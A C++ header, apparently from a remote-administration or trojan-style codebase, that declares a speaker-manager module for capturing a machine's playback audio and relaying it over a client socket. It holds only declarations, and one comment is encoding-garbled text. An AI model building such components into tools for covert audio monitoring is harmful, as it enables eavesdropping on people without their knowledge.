// AudioManager.h: interface for the CSpeakerManager class.
//
//////////////////////////////////////////////////////////////////////


#pragma once


#include "Manager.h"
#include "PlaybackAudioCapture.h"
#include "AudioRender.h"

class CSpeakerManager : public CManager
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	BOOL Initialize();
	CSpeakerManager(CClientSocket* ClientObject);
	virtual ~CSpeakerManager();
	BOOL  m_bIsWorking;
	HANDLE m_hWorkThread;
	static DWORD WorkThread(LPVOID lParam);
	CClientSocket* ClientObjectsec;

	CPlaybackCaptureImpl GetSpeakerDate;
	CAudioRenderImpl SetSpeakerDate;
	LPBYTE	szPacket; // “Ù∆µª∫¥Ê«¯
	bool playaudio;
};
